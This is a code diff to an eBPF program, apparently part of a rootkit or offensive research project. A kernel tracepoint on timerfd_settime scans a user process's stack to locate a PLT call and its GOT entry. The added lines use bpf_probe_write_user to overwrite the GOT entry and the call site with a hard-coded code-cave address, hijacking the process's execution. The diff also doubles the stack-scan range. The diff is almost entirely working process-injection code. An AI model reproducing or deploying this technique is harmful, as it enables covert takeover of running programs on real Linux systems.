@@ -14,6 +14,7 @@
 #define OPCODE_JUMP_BYTE_0 0xe8
 #define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
 #define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
+#define CODE_CAVE_ADDRESS 0x0000000000402e95
 
 struct sys_timerfd_settime_enter_ctx {
     unsigned long long unused; //Pointer to pt_regs
@@ -66,7 +67,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         //bpf_printk(" -- Failed OPCODE: %x\n", opcode_arr[0]);
         return -1;
     }
-    
+
     //We have localized the call instruction and thus quite probably the saved RIP. 
     //We proceed to get the offset of the call.
     __u32 offset;
@@ -121,6 +122,21 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         }
         bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
         bpf_printk("GOT_ADDR: %lx\n",got_addr);
+
+        __u64 buf = CODE_CAVE_ADDRESS;
+        bpf_printk("Now writing to J_ADDR %lx\n", j_addr);
+        if(bpf_probe_write_user(j_addr, &buf, sizeof(__u64))<0){
+            bpf_printk("FAILED TO WRITE J\n");
+        }else{
+            __u64 got_addr_new;
+            bpf_probe_read_user(&got_addr_new, sizeof(__u64), j_addr);
+            bpf_printk("Success, new GOT is %lx", got_addr_new);
+        }
+        bpf_printk("Now writing to CALL_ADDR %lx\n", call_addr);
+        if(bpf_probe_write_user(call_addr, &buf, sizeof(__u64))<0){
+            bpf_printk("FAILED TO WRITE CALL\n");
+        }
+
         //Now that we have the address placed in the GOT section we can finally go to the function in glibc
         //where the syscall resides. We read the opcodes and check that they are the ones expected
         __u8 s_opcode[14];
@@ -180,7 +196,7 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
     __u64 address = 0;
     bpf_printk("Timer %i to scan at address %lx\n", fd, scanner);
     #pragma unroll
-    for(__u64 ii=0; ii<100; ii++){
+    for(__u64 ii=0; ii<200; ii++){
         //We got a foothold in the stack via the syscall argument, now we scan to lower memory
         //positions assuming those are the saced RIP. We will then perform checks in order to see
         //if it truly is the saved RIP (checking that there is a path to the actual syscall).
@@ -210,7 +226,7 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
         }
     }
 
-    
+    bpf_printk("Finished without findings\n");
 
 
     return 0;
@@ -272,6 +288,7 @@ int uprobe_execute_command(struct pt_regs *ctx){
     }
     //bpf_printk("Stack: %x\n", dest_buf);
 
+    
     return 0;
 }
 
